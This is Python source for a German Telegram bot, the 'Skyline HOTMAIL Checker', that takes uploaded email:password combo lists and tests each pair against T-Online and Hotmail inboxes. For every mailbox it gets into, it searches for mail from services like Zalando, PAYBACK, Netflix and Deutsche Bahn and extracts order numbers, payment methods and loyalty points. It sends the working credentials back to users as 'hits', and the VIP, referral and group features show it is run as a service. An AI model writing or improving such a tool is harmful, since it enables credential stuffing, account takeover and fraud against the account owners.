        "order_regex": r'(?:Buchungsnummer|Confirmation\s*number|booking\s*number|reservation)[^\w]*([A-Z0-9\.\-]{4,20})',
    },
    "zalando": {
        "name": "Zalando",
        "emoji": "👗",
        "mode": "inbox_zalando",
        "tonline_senders": ["noreply@zalando.de", "service@zalando.de", "newsletter@zalando.de"],
        "hotmail_queries": ['from:"noreply@zalando.de"', 'from:"service@zalando.de"', 'from:"newsletter@zalando.de"'],
        "order_regex": r'(?:Bestellnummer|Bestell-Nr|order)[^\w]*([A-Z0-9\-]{5,20})',
    },
    "lime": {
        "name": "Lime",
        "emoji": "🛴",
        "mode": "inbox_lime",
        "tonline_senders": ["no-reply@li.me"],
        "hotmail_queries": ['from:"no-reply@li.me"'],
        "order_regex": r'(?:trip|ride|fahrt|receipt|order)[^\w]*([A-Z0-9\-]{4,25})',
    },
    "payback": {
        "name": "PAYBACK",
        "emoji": "💳",
        "mode": "inbox_payback",
        "tonline_senders": ["service@payback.de"],
        "hotmail_queries": ['from:"service@payback.de"'],
        "order_regex": r'(?:Punkte|Points|Punktestand|Guthaben)',
        "custom_handler": "payback",
    },
    "mcdonalds": {
        "name": "McDonald's",
        "emoji": "🍔",
        "mode": "inbox_mcdonalds",
        "tonline_senders": ["noreply@mcdonalds.de", "info@mcdonalds.de", "noreply@mcdonalds.com", "mcdonalds@email.mcdonalds.com"],
        "hotmail_queries": ['from:"noreply@mcdonalds.de"', 'from:"mcdonalds.de"', 'from:"mcdonalds.com"'],
        "order_regex": r'(?:Bestellnummer|Bestell-Nr|Order)[^\w]*([A-Z0-9\-]{4,20})',
    },
    "deutschebahn": {
        "name": "Deutsche Bahn",
        "emoji": "🚆",
        "mode": "inbox_deutschebahn",
        "tonline_senders": ["noreply@bahn.de", "noreply@deutschebahn.com"],
        "hotmail_queries": ['from:"noreply@bahn.de"', 'from:"noreply@deutschebahn.com"'],
        "order_regex": r'(?:Auftragsnummer|Buchungsnummer|Booking|Order)[^\w]*([A-Z0-9\-]{5,20})',
    },
    "dhl": {
        "name": "DHL",
        "emoji": "📦",
        "mode": "inbox_dhl",
        "tonline_senders": ["noreply@dhl.de", "paket@dhl.de"],
        "hotmail_queries": ['from:"noreply@dhl.de"', 'from:"paket@dhl.de"'],
        "order_regex": r'(?:Sendungsnummer|Tracking|Paketnummer)[^\w]*([A-Z0-9\-]{8,30})',
    },
    "otto": {
        "name": "Otto",
        "emoji": "🛒",
        "mode": "inbox_otto",
        "tonline_senders": ["noreply@otto.de", "service@otto.de"],
        "hotmail_queries": ['from:"noreply@otto.de"', 'from:"service@otto.de"'],
        "order_regex": r'(?:Bestellnummer|Auftragsnummer|Order)[^\w]*([A-Z0-9\-]{5,20})',
    },
    "ebay": {
        "name": "eBay",
        "emoji": "🏷️",
        "mode": "inbox_ebay",
        "tonline_senders": ["ebay@ebay.de", "reply@ebay.de"],
        "hotmail_queries": ['from:"ebay@ebay.de"', 'from:"reply@ebay.de"'],
        "order_regex": r'(?:Artikelnummer|Bestellnummer|Item)[^\w]*([A-Z0-9\-]{5,20})',
    },
    "netflix": {
        "name": "Netflix",
        "emoji": "🎬",
        "mode": "inbox_netflix",
        "tonline_senders": ["info@account.netflix.com"],
        "hotmail_queries": ['from:"info@account.netflix.com"'],
        "order_regex": r'(?:account|Konto|subscription)[^\w]*([A-Z0-9\-]{5,20})',
    },
    "spotify": {
        "name": "Spotify",
        "emoji": "🎵",
        "mode": "inbox_spotify",
        "tonline_senders": ["no-reply@spotify.com"],
        "hotmail_queries": ['from:"no-reply@spotify.com"'],
        "order_regex": r'(?:account|Konto|subscription)[^\w]*([A-Z0-9\-]{5,20})',
    },
    "check24": {
        "name": "Check24",
        "emoji": "✅",
        "mode": "inbox_check24",
        "tonline_senders": ["noreply@check24.de", "info@check24.de"],
        "hotmail_queries": ['from:"noreply@check24.de"', 'from:"info@check24.de"'],
        "order_regex": r'(?:Vertragsnummer|Auftragsnummer|Buchung)[^\w]*([A-Z0-9\-]{5,20})',
    },
    "shein": {
        "name": "SHEIN",
        "emoji": "👠",
        "mode": "inbox_shein",
        "tonline_senders": ["noreply@sheinnotice.com"],
        "hotmail_queries": ['from:"noreply@sheinnotice.com"'],
        "order_regex": r'(?:Bestellnummer|Order|order\s*number)[^\w]*([A-Z0-9\-]{5,25})',
    },
    "flixbus": {
        "name": "FlixBus",
        "emoji": "🚌",
        "mode": "inbox_flixbus",
        "tonline_senders": ["noreply@flixbus.com", "booking@flixbus.com"],
        "hotmail_queries": ['from:"noreply@flixbus.com"', 'from:"booking@flixbus.com"'],
        "order_regex": r'(?:Buchungsnummer|Booking|Order)[^\w]*([A-Z0-9\-]{5,20})',
    },
    "flaschenpost": {
        "name": "Flaschenpost",
        "emoji": "🍾",
        "mode": "inbox_flaschenpost",
        "tonline_senders": ["noreply@flaschenpost.de", "info@flaschenpost.de"],
        "hotmail_queries": ['from:"noreply@flaschenpost.de"', 'from:"info@flaschenpost.de"'],
        "order_regex": r'(?:Bestellnummer|Bestell-Nr|Order)[^\w]*([A-Z0-9\-]{4,20})',
    },
}

KNOWN_SERVICE_SENDERS = {
    "ryd": ["noreply@ryd.one"],
    "limehome": ["noreply@limehome.com", "info@limehome.com"],
    "lime": ["no-reply@li.me"],
    "amazon": ["auto-confirm@amazon.de", "shipment-tracking@amazon.de", "noreply@amazon.de", "auto-confirm@amazon.com"],
    "paypal": ["service@paypal.de", "service@paypal.com", "paypal@mail.paypal.de"],
    "uber": ["noreply@uber.com", "uber@uber.com"],
    "lieferando": ["noreply@lieferando.de", "info@lieferando.de", "no-reply@connect.lieferando.de", "no-reply@lieferando.de"],
    "booking": ["noreply@booking.com", "customer.service@booking.com"],
    "zalando": ["noreply@zalando.de", "service@zalando.de"],
    "netflix": ["info@account.netflix.com"],
    "spotify": ["no-reply@spotify.com"],
    "instagram": ["security@mail.instagram.com"],
    "facebook": ["security@facebookmail.com"],
    "tiktok": ["register@account.tiktok.com"],
    "twitter": ["info@x.com"],
    "linkedin": ["security-noreply@linkedin.com"],
    "snapchat": ["no-reply@accounts.snapchat.com"],
    "discord": ["noreply@discord.com"],
    "steam": ["noreply@steampowered.com"],
    "xbox": ["xboxreps@engage.xbox.com"],
    "playstation": ["reply@txn-email.playstation.com"],
    "epic": ["help@acct.epicgames.com"],
    "epic games": ["help@acct.epicgames.com"],
    "disney": ["no-reply@disneyplus.com"],
    "disney+": ["no-reply@disneyplus.com"],
    "reddit": ["noreply@reddit.com", "noreply@redditmail.com"],
    "twitch": ["no-reply@twitch.tv"],
    "shein": ["noreply@sheinnotice.com"],
    "check24": ["noreply@check24.de", "info@check24.de"],
    "ebay": ["ebay@ebay.de", "reply@ebay.de"],
    "otto": ["noreply@otto.de", "service@otto.de"],
    "dhl": ["noreply@dhl.de", "paket@dhl.de"],
    "hermes": ["noreply@myhermes.de"],
    "google": ["no-reply@accounts.google.com"],
    "apple": ["noreply@email.apple.com", "appleid@id.apple.com"],
    "microsoft": ["account-security-noreply@accountprotection.microsoft.com"],
    "payback": ["service@payback.de"],
    "deutschebahn": ["noreply@bahn.de", "noreply@deutschebahn.com"],
    "deutsche bahn": ["noreply@bahn.de", "noreply@deutschebahn.com"],
    "db": ["noreply@bahn.de", "noreply@deutschebahn.com"],
    "flixbus": ["noreply@flixbus.com", "booking@flixbus.com"],
    "flaschenpost": ["noreply@flaschenpost.de", "info@flaschenpost.de"],
    "mcdonalds": ["noreply@mcdonalds.de", "info@mcdonalds.de", "noreply@mcdonalds.com", "mcdonalds@email.mcdonalds.com"],
    "mcdonald's": ["noreply@mcdonalds.de", "info@mcdonalds.de", "noreply@mcdonalds.com", "mcdonalds@email.mcdonalds.com"],
}


def run_generic_inbox_check(message, user_id, service_key):
    svc = INBOX_SERVICES[service_key]
    service_name = svc["name"]
    emoji = svc["emoji"]
    tonline_senders = svc["tonline_senders"]
    hotmail_queries = svc["hotmail_queries"]
    order_regex = svc["order_regex"]

    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        raw_lines = downloaded_file.decode('utf-8', errors='ignore').splitlines()

        combos = []
        for line in raw_lines:
            line = line.strip()
            if not line or ':' not in line:
                continue
            parts = line.split(':', 1)
            email_addr, password = parts[0].strip(), parts[1].strip()
            if password and '@' in email_addr and '.' in email_addr.split('@')[-1]:
                combos.append((email_addr, password))

        total = len(combos)
        if total == 0:
            bot.send_message(message.chat.id, "❌ Keine gültigen Zeilen gefunden.")
            user_sessions.pop(user_id, None)
            return

        if not start_scan(user_id):
            bot.send_message(message.chat.id, "⚠️ Du hast bereits einen aktiven Scan! Bitte warte bis er fertig ist.", parse_mode='HTML')
            return

        progress_msg = bot.send_message(
            message.chat.id,
            f"{emoji} <b>{service_name} Inbox Check gestartet!</b>\n\n"
            f"📬 Sender: <code>{', '.join(tonline_senders[:2])}</code>\n"
            f"📥 Accounts: <b>{total}</b>\n\n"
            f"⏳ Bitte warten...",
            parse_mode='HTML',
            reply_markup=stop_scan_keyboard(user_id)
        )

        hits = []
        bads = []
        no_inbox = []
        errors_list = []
        checked = [0]
        lock = threading.Lock()

        def check_one(combo):
            email_addr, password = combo
            if not active_scans.get(user_id, False):
                return
            try:
                result, provider = check_account_auto(email_addr, password)
                if result.get("status") == "RETRY":
                    result, provider = check_account_auto(email_addr, password)

                status = result.get("status", "RETRY")

                if status == "BAD":
                    with lock:
                        checked[0] += 1
                        bads.append(f"{email_addr}:{password}")
                    return

                if status != "HIT":
                    with lock:
                        checked[0] += 1
                        errors_list.append(f"{email_addr}:{password} | {status}")
                    return

                found = False
                orders = []
                payments = []
                payback_points = []
                is_payback = svc.get("custom_handler") == "payback"

                if provider == "tonline":
                    for sender in tonline_senders:
                        sf_found, fetched = TOnlineChecker.search_and_fetch(email_addr, password, sender, max_count=10)
                        if sf_found:
                            found = True
                            for item in fetched:
                                combined = item.get("subject", "") + " " + item.get("body", "")
                                if is_payback:
                                    for pm in re.findall(r'(\d[\d\.,]*)\s*(?:Punkte|Points|PAYBACK\s*Punkte)', combined, re.IGNORECASE):
                                        pts = pm.replace(".", "").replace(",", "")
                                        if pts.isdigit() and int(pts) > 0 and pts not in payback_points:
                                            payback_points.append(pts)
                                    for pm in re.findall(r'(?:Punktestand|Kontostand|Guthaben|aktuell)[:\s]*(\d[\d\.,]*)', combined, re.IGNORECASE):
                                        pts = pm.replace(".", "").replace(",", "")
                                        if pts.isdigit() and int(pts) > 0 and pts not in payback_points:
                                            payback_points.append(pts)
                                else:
                                    order_match = re.search(order_regex, combined, re.IGNORECASE)
                                    if order_match:
                                        o = order_match.group(1)
                                        if o not in orders:
                                            orders.append(o)
                                for p in extract_payment_from_text(combined.lower()):
                                    if p not in payments:
                                        payments.append(p)
                            break
                else:
                    token = result.get("token", "")
                    cid = result.get("cid", "")
                    for query in hotmail_queries:
                        email_texts = _hotmail_search_and_fetch(token, cid, query, 10)
                        if email_texts:
                            found = True
                            for item in email_texts:
                                combined = (item.get("subject", "") + " " + item.get("body", ""))
                                if is_payback:
                                    for pm in re.findall(r'(\d[\d\.,]*)\s*(?:Punkte|Points|PAYBACK\s*Punkte)', combined, re.IGNORECASE):
                                        pts = pm.replace(".", "").replace(",", "")
                                        if pts.isdigit() and int(pts) > 0 and pts not in payback_points:
                                            payback_points.append(pts)
                                    for pm in re.findall(r'(?:Punktestand|Kontostand|Guthaben|aktuell)[:\s]*(\d[\d\.,]*)', combined, re.IGNORECASE):
                                        pts = pm.replace(".", "").replace(",", "")
                                        if pts.isdigit() and int(pts) > 0 and pts not in payback_points:
                                            payback_points.append(pts)
                                else:
                                    order_match = re.search(order_regex, combined, re.IGNORECASE)
                                    if order_match:
                                        o = order_match.group(1)
                                        if o not in orders:
                                            orders.append(o)
                                for p in extract_payment_from_text(combined.lower()):
                                    if p not in payments:
                                        payments.append(p)
                            break

                with lock:
                    checked[0] += 1
                    if found:
                        if is_payback:
                            pts_str = ", ".join(payback_points) if payback_points else "Nicht gefunden"
                            hits.append(f"{email_addr}:{password} | PAYBACK ✅ | Punkte: {pts_str}")
                        else:
                            order_str = ", ".join(orders) if orders else "Keine"
                            pay_str = " | ".join(payments) if payments else "Keine"
                            hits.append(f"{email_addr}:{password} | {service_name} ✅ | Bestellungen: {order_str} | Zahlung: {pay_str}")
                        hit_num = len(hits)
                    else:
                        no_inbox.append(f"{email_addr}:{password}")

                if found:
                    try:
                        if is_payback:
                            pts_display = ", ".join(payback_points) if payback_points else "Nicht gefunden"
                            max_pts = max((int(p) for p in payback_points), default=0) if payback_points else 0
                            hit_msg = (
                                f"━━━━━━━━━━━━━━━━━━━━\n"
                                f"💳 <b>PAYBACK HIT #{hit_num}</b>\n"
                                f"━━━━━━━━━━━━━━━━━━━━\n\n"
                                f"📧 Email: <code>{email_addr}</code>\n"
                                f"🔑 Password: <code>{password}</code>\n\n"
                                f"💳 <b>Service:</b> PAYBACK\n"
                                f"💰 <b>Punkte:</b> {max_pts if max_pts > 0 else pts_display}\n\n"
                                f"━━━━━━━━━━━━━━━━━━━━\n"
                                f"💎 {MY_SIGNATURE}"
                            )
                        else:
                            order_str = ", ".join(orders) if orders else "Keine"
                            pay_str = " | ".join(payments) if payments else "Keine"
                            hit_msg = (
                                f"━━━━━━━━━━━━━━━━━━━━\n"
                                f"{emoji} <b>{service_name} HIT #{hit_num}</b>\n"
                                f"━━━━━━━━━━━━━━━━━━━━\n\n"
                                f"📧 Email: <code>{email_addr}</code>\n"
                                f"🔑 Password: <code>{password}</code>\n\n"
                                f"{emoji} <b>Service:</b> {service_name}\n"
                                f"📦 <b>Bestellungen:</b> {order_str}\n"
                                f"💳 <b>Zahlungsmethode:</b> {pay_str}\n\n"
                                f"━━━━━━━━━━━━━━━━━━━━\n"
                                f"💎 {MY_SIGNATURE}"
                            )
                        generic_is_group = is_allowed_group(message.chat.id) and message.chat.id != user_id
                        send_target = user_id if generic_is_group else message.chat.id
                        bot.send_message(send_target, hit_msg, parse_mode='HTML')
                    except Exception:
                        pass
            except Exception as e:
                print(f"[{service_name}] Error checking {email_addr}: {e}")
                with lock:
                    checked[0] += 1
                    errors_list.append(f"{email_addr}:{password} | ERROR")

        def progress_updater():
            last = -1
            while checked[0] < total and active_scans.get(user_id, False):
                if checked[0] != last:
                    last = checked[0]
                    try:
                        bot.edit_message_text(
                            f"{emoji} <b>{service_name} Check läuft...</b>\n\n"
                            f"📊 Progress: <b>{checked[0]}/{total}</b>\n"
                            f"✅ Hits: <b>{len(hits)}</b> | ❌ Bad: <b>{len(bads)}</b> | 📭 Kein Match: <b>{len(no_inbox)}</b>",
                            message.chat.id,
                            progress_msg.message_id,
                            parse_mode='HTML',
                            reply_markup=stop_scan_keyboard(user_id)
                        )
                    except:
                        pass
                time.sleep(3)

        _chat_id = message.chat.id
        _pm_id = progress_msg.message_id
        _username = message.from_user.username or ""

        def _generic_scan_thread():
          try:
            threading.Thread(target=progress_updater, daemon=True).start()

            with concurrent.futures.ThreadPoolExecutor(max_workers=15) as executor:
                executor.map(check_one, combos)

            end_scan(user_id)

            try:
                bot.delete_message(_chat_id, _pm_id)
            except:
                pass

            checked_count = checked[0]
            svc_upper = service_name.upper()

            record_inbox(user_id, username=_username, service_name=service_name,
                        combos_count=checked_count, hits=len(hits), bads=len(bads))

            generic_is_group = is_allowed_group(_chat_id) and _chat_id != user_id

            summary = (
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"{emoji} <b>{svc_upper} SCAN {'⏹ GESTOPPT' if checked_count < total else 'ABGESCHLOSSEN'}</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━\n\n"
                f"📊 <b>Gecheckt:</b> {checked_count}/{total}\n"
                f"✅ <b>Linked (Hit):</b> {len(hits)}\n"
                f"📭 <b>Login OK, kein {service_name}:</b> {len(no_inbox)}\n"
                f"❌ <b>Bad (Login fehlgeschlagen):</b> {len(bads)}\n"
                f"🔄 <b>Errors/Retry:</b> {len(errors_list)}\n\n"
                f"{'📩 <i>Hits wurden dir privat gesendet!</i>' + chr(10) + chr(10) if generic_is_group and hits else ''}"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"💎 {MY_SIGNATURE}"
            )
            bot.send_message(_chat_id, summary, parse_mode='HTML')

            all_lines = []
            if hits:
                all_lines.append("═══ HITS (LINKED) ═══")
                all_lines.extend(hits)
            if no_inbox:
                all_lines.append(f"\n═══ LOGIN OK / KEIN {svc_upper} ═══")
                all_lines.extend(no_inbox)
            if bads:
                all_lines.append("\n═══ BAD (LOGIN FAILED) ═══")
                all_lines.extend(bads)
            if errors_list:
                all_lines.append("\n═══ ERRORS / RETRY ═══")
                all_lines.extend(errors_list)

            if all_lines:
                file_obj = BytesIO("\n".join(all_lines).encode('utf-8'))
                file_obj.name = f"{svc_upper}_FULL_{len(hits)}hits_{len(bads)}bad_{total}total.txt"
                send_target = user_id if generic_is_group else _chat_id
                bot.send_document(
                    send_target,
                    file_obj,
                    caption=(
                        f"{emoji} <b>{service_name} Ergebnis</b>\n"
                        f"✅ {len(hits)} Hits | ❌ {len(bads)} Bad | 📭 {len(no_inbox)} Kein Match | 🔄 {len(errors_list)} Errors\n\n"
                        f"💎 {MY_SIGNATURE}"
                    ),
                    parse_mode='HTML'
                )
          except Exception as e:
            try:
                bot.send_message(_chat_id, f"❌ Fehler: {str(e)}")
            except:
                pass
          finally:
            user_sessions.pop(user_id, None)
            end_scan(user_id)

        threading.Thread(target=_generic_scan_thread, daemon=True).start()
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Fehler: {str(e)}")


# Start Command
@bot.message_handler(commands=['start'])
def start_command_json(message):
    """Start with JSON + referral handling"""
    user_id = message.from_user.id
    username = message.from_user.username or "unknown"
    first_name = message.from_user.first_name or "User"

    log_user_activity(user_id, username, "start", message)

    if is_group_chat(message):
        if not is_allowed_group(message.chat.id):
            if user_id == ADMIN_ID:
                add_allowed_group(message.chat.id)
                bot.send_message(message.chat.id,
                    f"✅ <b>Gruppe aktiviert!</b>\n\n"
                    f"📍 Chat-ID: <code>{message.chat.id}</code>\n"
                    f"Alle Mitglieder können den Bot jetzt <b>kostenlos</b> nutzen!\n\n"
                    f"💎 {MY_SIGNATURE}", parse_mode='HTML',
                    reply_markup=main_menu_keyboard(user_id))
            else:
                bot.send_message(message.chat.id,
                    f"❌ <b>Nicht autorisiert!</b>\n\n"
                    f"Nur der Admin kann den Bot zu Gruppen hinzufügen.\n\n"
                    f"💎 {MY_SIGNATURE}", parse_mode='HTML')
            return
        bot.send_message(message.chat.id,
            f"⚡ <b>Skyline HOTMAIL Checker</b>\n\n"
            f"👋 Hallo <b>{first_name}</b>!\n"
            f"🆓 In dieser Gruppe sind alle Features <b>KOSTENLOS</b>!\n\n"
            f"📋 Drücke einen Button um zu starten!\n\n"
            f"💎 {MY_SIGNATURE}", parse_mode='HTML',
            reply_markup=main_menu_keyboard(user_id))
        return

    add_json_user(user_id, username, first_name)
    try:
        add_user(user_id, username)
    except Exception as e:
        print(f"[Start] SQLite add_user error for {user_id}: {e}")

    user = get_json_user(user_id)
    if is_banned(user_id) or (user and user.get('is_banned')):
        bot.send_message(user_id, f"❌ <b>You are banned by admin {MY_SIGNATURE}</b>", parse_mode='HTML')
        return

    args = message.text.split()
    if len(args) > 1:
        ref_code = args[1]
        try:
            conn = get_db()
            c = conn.cursor()
            c.execute("SELECT user_id FROM users WHERE referral_code = ?", (ref_code,))
            referrer = c.fetchone()
            conn.close()

            if referrer and referrer[0] != user_id:
                referrer_id = referrer[0]
                success, reward_text, milestone_msg = process_referral(user_id, referrer_id)
                if success:
                    try:
                        bot.send_message(referrer_id,
                            f"🎉 <b>Neuer Referral!</b>\n\n"
                            f"User <code>{user_id}</code> ist über deinen Link beigetreten!\n\n"
                            f"✅ Du bekommst <b>{reward_text}</b>{milestone_msg}",
                            parse_mode='HTML')
                    except Exception as e:
                        print(f"[Start] Failed to notify referrer {referrer_id}: {e}")

                    if milestone_msg:
                        try:
                            bot.send_message(ADMIN_ID,
                                f"🏆 <b>REFERRAL MILESTONE!</b>\n\n"
                                f"👤 User: <code>{referrer_id}</code>\n"
                                f"🎯 Belohnung: {reward_text}{milestone_msg}",
                                parse_mode='HTML')
                        except Exception as e:
                            print(f"[Start] Failed to notify admin about milestone: {e}")
        except Exception as e:
            print(f"[Start] Referral processing error: {e}")

    # Trial VIP for brand new users (1 hour free trial)
    is_new_user = False
    db_user = get_user(user_id)
    trial_used = False
    if db_user:
        try:
            conn_t = get_db()
            c_t = conn_t.cursor()
            c_t.execute("SELECT trial_used FROM users WHERE user_id = ?", (user_id,))
            row_t = c_t.fetchone()
            trial_used = bool(row_t and row_t[0])
            conn_t.close()
        except:
            trial_used = True

    if db_user and not trial_used and not db_user[2]:
        is_new_user = True
        add_vip(user_id, username, "1h")
        conn_t = get_db()
        c_t = conn_t.cursor()
        c_t.execute("UPDATE users SET trial_used = 1 WHERE user_id = ?", (user_id,))
        conn_t.commit()
        conn_t.close()
        try:
            bot.send_message(user_id, t(user_id, "welcome_gift", signature=MY_SIGNATURE), parse_mode='HTML')
        except Exception:
            pass

    admin_badge = "🔧 ADMIN" if user_id == ADMIN_ID else ""
    vip_status = '👑 VIP' if is_vip(user_id) else 'Free'
    trial_note = "\n🎁 <i>Trial VIP active! (1h)</i>" if is_new_user else ""

    welcome = t(user_id, "welcome", admin_badge=admin_badge, first_name=first_name,
               uid=user_id, vip_status=vip_status, trial_note=trial_note, signature=MY_SIGNATURE)

    bot.send_message(user_id, welcome, parse_mode='HTML',
                    reply_markup=main_menu_keyboard(user_id))

# Handle Main Menu Buttons
@bot.message_handler(func=lambda message: True)
def handle_message(message):
    user_id = message.from_user.id
    text = message.text

    if is_group_chat(message) and not is_allowed_group(message.chat.id):
        return

    in_free_group = is_group_chat(message) and is_allowed_group(message.chat.id)

    username = message.from_user.username or "unknown"
    if text:
        log_user_activity(user_id, username, f"msg:{text[:50]}", message)

    if is_banned(user_id):
        bot.send_message(message.chat.id, t(user_id, "banned", signature=MY_SIGNATURE), parse_mode='HTML')
        return

    def _btn_match(key):
        for lang in TRANSLATIONS:
            if text == TRANSLATIONS[lang].get(key, ""):
                return True
        return False

    if _btn_match("btn_language") or text in ("🌐 Sprache", "🌐 Language"):
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            types.InlineKeyboardButton("🇩🇪 Deutsch", callback_data="set_lang_de"),
            types.InlineKeyboardButton("🇬🇧 English", callback_data="set_lang_en")
        )
        bot.send_message(message.chat.id, t(user_id, "choose_language"), parse_mode='HTML', reply_markup=markup)
        return

    session = user_sessions.get(user_id, {})
    s_mode = session.get("mode", "")

    if s_mode == "redeem_code" and text and not text.startswith("/"):
        code = text.strip().upper()
        success, msg_text = use_redeem_code(code, user_id)
        bot.send_message(message.chat.id, msg_text)
        user_sessions.pop(user_id, None)
        return

    if s_mode == "admin_add_vip":
        if user_id != ADMIN_ID:
            user_sessions.pop(user_id, None)
            return
        step = session.get("step", "waiting_id")
        if step == "waiting_id":
            try:
                target_user_id = int(text.strip())
                u = get_json_user(target_user_id)
                uname = u.get("username", "Unknown") if u else "Unknown"
                user_sessions[user_id] = {
                    "mode": "admin_add_vip", "step": "waiting_duration",
                    "vip_target_id": target_user_id, "vip_target_username": uname
                }
                bot.send_message(message.chat.id,
                    f"✅ User: <code>{target_user_id}</code> (@{uname})\n\nWähle die VIP-Dauer:",
                    parse_mode='HTML', reply_markup=vip_duration_keyboard())
            except ValueError:
                bot.send_message(message.chat.id, "❌ Ungültige User ID! Nochmal:")
        return

    if s_mode == "admin_remove_vip":
        if user_id != ADMIN_ID:
            user_sessions.pop(user_id, None)
            return
        try:
            target_user_id = int(text.strip())
            user = get_user(target_user_id)
            if not user:
                bot.send_message(message.chat.id, "❌ User nicht gefunden!")
            elif user[2] == 0:
                bot.send_message(message.chat.id, "❌ User ist kein VIP!")
            else:
                remove_vip(target_user_id)
                bot.send_message(message.chat.id,
                    f"✅ <b>VIP entfernt!</b>\n\n<code>{target_user_id}</code> ist jetzt Free.",
                    parse_mode='HTML', reply_markup=admin_panel_keyboard())
                try:
                    bot.send_message(target_user_id,
                        f"⚠️ Dein VIP-Status wurde entfernt.\n\n💎 {MY_SIGNATURE}", parse_mode='HTML')
                except:
                    pass
        except ValueError:
            bot.send_message(message.chat.id, "❌ Ungültige User ID!")
        user_sessions.pop(user_id, None)
        return

    if s_mode == "admin_ban_user":
        if user_id != ADMIN_ID:
            user_sessions.pop(user_id, None)
            return
        try:
            target_user_id = int(text.strip())
            if target_user_id == ADMIN_ID:
                bot.send_message(message.chat.id, "❌ Admin kann nicht gebannt werden!")
            else:
                user = get_user(target_user_id)
                if not user:
                    bot.send_message(message.chat.id, "❌ User nicht gefunden!")
                else:
                    ban_user(target_user_id, "Banned by admin")
                    bot.send_message(message.chat.id,
                        f"✅ <b>User gebannt!</b>\n\n<code>{target_user_id}</code>",
                        parse_mode='HTML', reply_markup=admin_panel_keyboard())
                    try:
                        bot.send_message(target_user_id,
                            f"❌ <b>Du wurdest vom Admin gebannt.</b>\n\n💎 {MY_SIGNATURE}", parse_mode='HTML')
                    except:
                        pass
        except ValueError:
            bot.send_message(message.chat.id, "❌ Ungültige User ID!")
        user_sessions.pop(user_id, None)
        return

    if s_mode == "admin_unban_user":
        if user_id != ADMIN_ID:
            user_sessions.pop(user_id, None)
            return
        try:
            target_user_id = int(text.strip())
            user = get_user(target_user_id)
            if not user:
                bot.send_message(message.chat.id, "❌ User nicht gefunden!")
            elif user[4] == 0:
                bot.send_message(message.chat.id, "❌ User ist nicht gebannt!")
            else:
                unban_user(target_user_id)
                bot.send_message(message.chat.id,
                    f"✅ <b>User entbannt!</b>\n\n<code>{target_user_id}</code>",
                    parse_mode='HTML', reply_markup=admin_panel_keyboard())
                try:
                    bot.send_message(target_user_id,
                        f"✅ Du wurdest entbannt!\n\n💎 {MY_SIGNATURE}", parse_mode='HTML')
                except:
                    pass
        except ValueError:
            bot.send_message(message.chat.id, "❌ Ungültige User ID!")
        user_sessions.pop(user_id, None)
        return

    if s_mode == "admin_broadcast_all":
        if user_id != ADMIN_ID:
            user_sessions.pop(user_id, None)
            return
        user_sessions.pop(user_id, None)
        conn = get_db()
        c = conn.cursor()
        c.execute("SELECT user_id FROM users WHERE is_banned = 0")
        users_list = c.fetchall()
        conn.close()
        if not users_list:
            bot.send_message(message.chat.id, "❌ Keine User!")
            return
        success_c = 0
        failed_c = 0
        status_msg = bot.send_message(message.chat.id, f"📤 Broadcasting... 0/{len(users_list)}")
        for i, u in enumerate(users_list, 1):
            try:
                bot.send_message(u[0], f"📢 <b>Nachricht vom Admin</b>\n\n{text}", parse_mode='HTML')
                success_c += 1
            except:
                failed_c += 1
            if i % 10 == 0:
                try:
                    bot.edit_message_text(f"📤 Broadcasting... {i}/{len(users_list)}\n✅ {success_c} ❌ {failed_c}",
                        message.chat.id, status_msg.message_id)
                except:
                    pass
        bot.edit_message_text(
            f"✅ <b>Broadcast fertig!</b>\n\nGesamt: {len(users_list)}\n✅ {success_c}\n❌ {failed_c}",
            message.chat.id, status_msg.message_id, parse_mode='HTML')
        return

    if s_mode == "admin_broadcast_one":
        if user_id != ADMIN_ID:
            user_sessions.pop(user_id, None)
            return
        step = session.get("step", "waiting_id")
        if step == "waiting_id":
            try:
                target_user_id = int(text.strip())
                user = get_user(target_user_id)
                if not user:
                    bot.send_message(message.chat.id, "❌ User nicht gefunden!")
                    user_sessions.pop(user_id, None)
                    return
                user_sessions[user_id] = {"mode": "admin_broadcast_one", "step": "waiting_msg", "broadcast_target": target_user_id}
                bot.send_message(message.chat.id,
                    f"👤 <b>An User: {target_user_id}</b>\n\nJetzt die Nachricht senden:", parse_mode='HTML')
            except ValueError:
                bot.send_message(message.chat.id, "❌ Ungültige User ID!")
                user_sessions.pop(user_id, None)
        elif step == "waiting_msg":
            target_user_id = session.get("broadcast_target")
            user_sessions.pop(user_id, None)
            if not target_user_id:
                bot.send_message(message.chat.id, "❌ Kein Ziel-User!")
                return
            try:
                bot.send_message(target_user_id, f"📢 <b>Nachricht vom Admin</b>\n\n{text}", parse_mode='HTML')
                bot.send_message(message.chat.id, f"✅ Nachricht an {target_user_id} gesendet!")
            except Exception as e:
                bot.send_message(message.chat.id, f"❌ Fehler: {str(e)}")
        return

    if s_mode == "admin_group_add":
        if user_id != ADMIN_ID:
            user_sessions.pop(user_id, None)
            return
        try:
            gid = int(text.strip())
            add_allowed_group(gid)
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("◀️ Back", callback_data="admin_groups"))
            bot.send_message(message.chat.id,
                f"✅ Gruppe <code>{gid}</code> wurde aktiviert!", parse_mode='HTML', reply_markup=markup)
        except:
            bot.send_message(message.chat.id, "❌ Ungültige Chat-ID!")
        user_sessions.pop(user_id, None)
        return

    if s_mode == "admin_search_log":
        if user_id != ADMIN_ID:
            user_sessions.pop(user_id, None)
            return
        try:
            target_uid = text.strip()
            user_log = get_user_log(target_uid)
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("◀️ Back", callback_data="admin_user_logs"))
            if not user_log:
                bot.send_message(message.chat.id, f"❌ Kein Log für <code>{target_uid}</code>",
                    parse_mode='HTML', reply_markup=markup)
            else:
                uname = user_log.get("username", "N/A")
                devices = ", ".join(user_log.get("devices", [])) or "N/A"
                actions = user_log.get("actions", [])[-10:]
                action_lines = [f"• {a.get('time','?')} | {a.get('action','?')[:40]} | {a.get('chat_type','?')}" for a in reversed(actions)]
                log_text = (f"📋 <b>LOG: {target_uid}</b> (@{uname})\n\n"
                    f"📱 <b>Geräte:</b> {devices}\n"
                    f"📊 <b>Aktionen:</b> {len(user_log.get('actions', []))}\n\n"
